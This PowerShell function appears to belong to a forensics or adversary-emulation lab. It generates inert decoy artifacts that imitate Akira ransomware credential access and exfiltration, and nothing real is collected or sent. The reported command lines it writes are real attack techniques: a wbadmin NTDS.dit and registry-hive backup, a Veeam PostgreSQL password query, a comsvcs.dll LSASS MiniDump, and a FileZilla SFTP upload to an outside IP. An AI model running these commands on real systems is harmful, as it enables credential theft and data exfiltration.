function Invoke-AkiraFlashCredentialAccessExfiltration {
    param([Parameter(Mandatory)][System.Collections.IDictionary]$Paths)
    $time = Get-AkiraFlashTimeline
    $credentialTime = $time.Adaptix.AddHours(8)

    $wbadmin = Join-Path $Paths.Tools 'wbadmin.exe'
    New-AkiraFlashBinaryDecoy -Path $wbadmin -Role 'wbadmin NTDS backup-abuse command-line canary'
    $wbadminCommand = 'wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:"C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY" -quiet'
    Invoke-AkiraFlashDecoyProcess -FilePath $wbadmin -ReportedCommandLine $wbadminCommand
    Write-AkiraFlashEvidenceFile -Path (Join-Path $Paths.SyntheticDC 'Windows\NTDS\ntds.dit') -Content 'AKIRA-FLASH-CANARY - synthetic NTDS filename only; no directory secrets.' -Purpose 'NTDS-shaped generated canary' -Timestamp $credentialTime
    Write-AkiraFlashEvidenceFile -Path (Join-Path $Paths.SyntheticDC 'Windows\System32\config\SYSTEM') -Content 'AKIRA-FLASH-CANARY - synthetic SYSTEM hive filename only.' -Purpose 'SYSTEM-hive-shaped generated canary' -Timestamp $credentialTime
    Write-AkiraFlashEvidenceFile -Path (Join-Path $Paths.SyntheticDC 'Windows\System32\config\SECURITY') -Content 'AKIRA-FLASH-CANARY - synthetic SECURITY hive filename only.' -Purpose 'SECURITY-hive-shaped generated canary' -Timestamp $credentialTime

    $psql = Join-Path $Paths.Tools 'psql.exe'
    New-AkiraFlashBinaryDecoy -Path $psql -Role 'Veeam PostgreSQL credential-query process-name canary'
    Invoke-AkiraFlashDecoyProcess -FilePath $psql -ReportedCommandLine 'psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"'
    $veeamCredentials = @"
user_name,password,description,change_time_utc
LAB-CANARY,NOT-A-REAL-PASSWORD,Synthetic Veeam credential row,$($credentialTime.ToString('o'))
"@
    Write-AkiraFlashEvidenceFile -Path (Join-Path $Paths.Veeam 'credentials.csv') -Content $veeamCredentials -Purpose 'generated Veeam query result containing no real credential' -Timestamp $credentialTime.AddMinutes(22)

    $rundll32 = Join-Path $Paths.Tools 'rundll32.exe'
    New-AkiraFlashBinaryDecoy -Path $rundll32 -Role 'comsvcs MiniDump command-line canary; never loads comsvcs.dll'
    Invoke-AkiraFlashDecoyProcess -FilePath $rundll32 -ReportedCommandLine 'rundll32.exe C:\Windows\System32\comsvcs.dll,#24 CANARY-PID C:\Windows\Temp\diagnostic.avhdx full'
    Write-AkiraFlashEvidenceFile -Path (Join-Path $Paths.Staging 'Windows-Temp\diagnostic.avhdx') -Content 'AKIRA-FLASH-CANARY - no process memory or credentials; LSASS dump-shaped filename only.' -Purpose 'inert LSASS dump-shaped artifact' -Timestamp $credentialTime.AddMinutes(35)

    $fileServerData = Join-Path $Paths.CanaryData 'ROOT-FILE01\Departments'
    Write-AkiraFlashEvidenceFile -Path (Join-Path $fileServerData 'Finance_CANARY.xlsx') -Content "DFIR-CANARY,Quarter,Amount`nDFIR-CANARY,Q3,0" -Purpose 'generated collection canary' -Timestamp $credentialTime.AddHours(4)
    Write-AkiraFlashEvidenceFile -Path (Join-Path $fileServerData 'Engineering_CANARY.docx') -Content 'Generated Akira flash-alert collection canary. No user data.' -Purpose 'generated collection canary' -Timestamp $credentialTime.AddHours(4)
    $archive = Join-Path $Paths.Staging 'root-domain-collection.zip'
    Compress-Archive -Path (Join-Path $fileServerData '*') -DestinationPath $archive -Force
    Set-AkiraFlashArtifactTime -Path $archive -Timestamp $credentialTime.AddHours(4).AddMinutes(5)
    Add-AkiraFlashManifestEntry -Type 'file' -Path $archive -Action 'created-from-generated-canaries' -Details @{ sha256 = (Get-FileHash -LiteralPath $archive -Algorithm SHA256).Hash; realUserData = $false }

    $fileZilla = Join-Path $Paths.Tools 'FileZilla.exe'
    New-AkiraFlashBinaryDecoy -Path $fileZilla -Role 'FileZilla SFTP exfiltration process-name canary'
    Invoke-AkiraFlashDecoyProcess -FilePath $fileZilla -ReportedCommandLine "FileZilla.exe sftp://LAB-CANARY@185.174.100.203:22/ --local `"$archive`" (actual connection 127.0.0.1 only)"
    Invoke-AkiraFlashLoopbackPort -Port 22 -ReportedTarget '185.174.100.203 SFTP exfiltration server'
    Add-AkiraFlashManifestEntry -Type 'exfiltration-canary' -Path $archive -Action 'not-transferred' -Details @{ reportedDestination = '185.174.100.203:22'; actualDestination = '127.0.0.1:22'; proxyUsed = $false }

    Add-AkiraFlashTimelineEvent -Timestamp $credentialTime -Phase 'Credential Access' -Event 'NTDS.dit and registry-hive backup represented with a wbadmin process-name canary and generated files.' -Details @{ domainControllerAccessed = $false; secretsCollected = $false }
    Add-AkiraFlashTimelineEvent -Timestamp $credentialTime.AddMinutes(22) -Phase 'Credential Access' -Event 'Veeam PostgreSQL credential query and multi-host LSASS dump represented by decoy command lines and generated output.' -Details @{ VeeamContacted = $false; LSASSAccessed = $false }
    Add-AkiraFlashTimelineEvent -Timestamp $credentialTime.AddHours(4) -Phase 'Collection and Exfiltration' -Event 'Generated enterprise files archived and FileZilla SFTP activity represented with a loopback port attempt.' -Details @{ reportedSftp = '185.174.100.203:22'; realExfiltration = $false }
}
